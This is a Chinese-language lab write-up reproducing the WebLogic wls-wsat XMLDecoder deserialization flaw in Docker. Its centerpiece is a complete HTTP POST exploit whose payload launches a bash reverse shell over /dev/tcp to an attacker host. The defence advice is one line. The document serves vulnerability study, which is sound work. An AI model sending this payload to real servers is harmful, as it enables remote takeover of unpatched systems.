# 【漏洞复现】Weblogic < 10.3.6 'wls-wsat' XMLDecoder 反序列化漏洞

- 序列化：就是把抽象的对象编程可存储、可传输的字节流(对象->字符串)。反序列化：就是把字节流转换成对象的过程(字符串->对象)。
- 反序列化漏洞：就是不管是PHP还是JAVA等编程语言，都有两个特殊的函数：`构造函数`和`析构函数`。这两个函数分别会在对象创建/销毁时自动调用。所以如果该函数中如果存在危险函数，则就有可能造成反序列化漏洞。
- Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。
- 影响版本： `10.3.6.0.0`、 `12.1.3.0.0`、  ` 12.2.1.2.0` 、`12.2.1.1.0` 
### 在docker中启动实验环境
![image](https://github.com/hecker-zz/blog/assets/153266742/a5d88591-a119-40e5-8924-d91aaaae4206)

### 访问7001端口，如显示404则环境搭建成功
![image](https://github.com/hecker-zz/blog/assets/153266742/fec6e30f-934a-49d2-82b1-73ec21b5299f)

### 访问7001:/wls-wsat/CoordinatorPortType 这个目录，如出现下图则可能存在漏洞
![image](https://github.com/hecker-zz/blog/assets/153266742/13187049-f389-4ffa-a024-1c350539c957)
### 直接去bp抓包Ctrl+R发送到重放模块
![image](https://github.com/hecker-zz/blog/assets/153266742/1d0516c6-8849-4914-99c0-6dd5f31d585f)

### 反弹一个shell
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: IP:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 640

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/IP/21 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```
### 修改完成后打开主机进行监听，然后反弹shell
### 主机监听
![image](https://github.com/hecker-zz/blog/assets/153266742/3dccb61a-6bb4-4cec-8146-a495073f71b3)

### 反弹后成功拿到shell
![image](https://github.com/hecker-zz/blog/assets/153266742/a70478bd-a0b3-4088-85b1-303d333fdcff)

### 漏洞防御
- 一般就是打补丁